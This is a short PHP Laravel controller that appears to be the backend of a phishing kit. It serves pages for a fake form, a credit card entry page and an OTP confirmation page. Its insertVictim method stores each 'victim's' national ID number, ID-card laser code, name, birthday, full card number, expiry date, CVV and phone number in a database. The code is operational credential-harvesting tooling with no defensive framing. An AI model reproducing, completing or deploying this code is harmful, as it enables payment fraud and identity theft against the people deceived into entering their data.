<?php

namespace App\Http\Controllers;

use App\Models\Victim;
use Illuminate\Http\Request;

class formController extends Controller
{
    //
    public function index() {
        return view('newform');
    }

    public function oldform() {
        return view('form');
    }

    public function card() {
        return view('creditcard');
    }

    public function otp(){
        return view('confirm_otp');
    }

    public function info(){
        return view('info');
    }

    public function insertVictim(Request $request){
        $new_request = new Victim;
        $new_request->identification_number = $request->in_personal_id;
        $new_request->first_name = $request->id_personal_fname;
        $new_request->last_name = $request->id_personal_lname;
        $new_request->birthday = strval($request->in_byear)."-".strval($request->in_bmonth)."-".strval($request->in_bday);
        $new_request->laser_code = $request->in_back_personal_id;
        $new_request->card_type = $request->in_card_type;
        $new_request->name_on_card = $request->in_card_name;
        $new_request->card_number = $request->in_card_id;
        $new_request->date_expire = $request->in_card_expired;
        $new_request->CVC_CVV = $request->in_card_cvv;
        $new_request->telephone = $request->in_tel;
        $new_request->save();
        return redirect()->route('home');
    }
}
